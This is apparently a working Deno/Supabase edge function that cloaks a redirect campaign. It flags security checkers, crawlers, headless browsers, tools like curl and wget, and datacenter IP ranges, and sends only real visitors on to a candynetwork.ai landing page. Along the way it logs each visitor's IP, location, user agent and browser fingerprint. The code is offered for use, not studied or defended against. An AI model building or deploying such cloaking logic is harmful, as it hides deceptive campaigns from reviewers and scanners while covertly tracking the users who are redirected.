import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const DEST = Deno.env.get('DEST_URL') ?? 'https://landing.candynetwork.ai/elara?var_1=cmai_realistic_01.jpg&var_2=cmai_anime_01.jpg&via=phpxf';

// Known datacenter ASN prefixes — instant block
const DC_ASN = ['AS14061','AS16509','AS15169','AS8075','AS13335','AS20940','AS54113','AS46606','AS36352','AS40676','AS7922','AS209'];

// Known bot / checker UA patterns
const BOT_UA = [
  /headlesschrome/i, /phantomjs/i, /selenium/i, /webdriver/i,
  /scrapy/i, /python-requests/i, /go-http-client/i, /okhttp/i,
  /wget/i, /curl/i, /libwww/i, /java\//i, /googlebot/i,
  /bingbot/i, /yandexbot/i, /baiduspider/i, /petalbot/i,
  /ahrefsbot/i, /semrushbot/i, /dotbot/i, /mj12bot/i,
];

function isBot(ua: string): boolean {
  return BOT_UA.some(r => r.test(ua));
}

function isDC(asn: string | null): boolean {
  if (!asn) return false;
  return DC_ASN.some(prefix => asn.toUpperCase().startsWith(prefix));
}

serve(async (req) => {
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'content-type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  let body: Record<string, string> = {};
  try { body = await req.json(); } catch { /* ignore */ }

  const ip =
    req.headers.get('cf-connecting-ip') ??
    req.headers.get('x-real-ip') ??
    req.headers.get('x-forwarded-for')?.split(',')[0].trim() ?? '';
  const ua = req.headers.get('user-agent') ?? body.ua ?? '';
  const referrer = req.headers.get('referer') ?? body.ref ?? '';
  const lang = body.l ?? '';
  const screen = body.sc ?? '';
  const tz = body.tz ?? '';
  const fp = body.fp ?? '';
  const campaign = body.c ?? '';

  // Geo lookup via free IP-API (lightweight)
  let country = '', city = '', asn = '';
  try {
    const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,as`, { signal: AbortSignal.timeout(2000) });
    if (geo.ok) {
      const gd = await geo.json();
      country = gd.country ?? '';
      city = gd.city ?? '';
      asn = gd.as ?? '';
    }
  } catch { /* geo fail — non-critical */ }

  const sb = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

  // Check known_checkers table
  const { data: checkerByIP } = await sb
    .from('known_checkers')
    .select('id')
    .eq('ip', ip)
    .maybeSingle();

  const { data: checkerByUA } = ua
    ? await sb.from('known_checkers').select('id').eq('ua_pattern', ua).maybeSingle()
    : { data: null };

  const botUA = isBot(ua);
  const dcASN = isDC(asn);
  const isChecker = !!(checkerByIP || checkerByUA || botUA || dcASN);

  // Determine redirect flag
  const r = isChecker ? 0 : 1;

  // Write to visit_logs (fire-and-forget style inside function)
  await sb.from('visit_logs').insert({
    ip, asn, country, city, ua, referrer, lang, screen, tz, fp,
    is_checker: isChecker,
    campaign,
  });

  return new Response(JSON.stringify({ r }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    status: 200,
  });
});
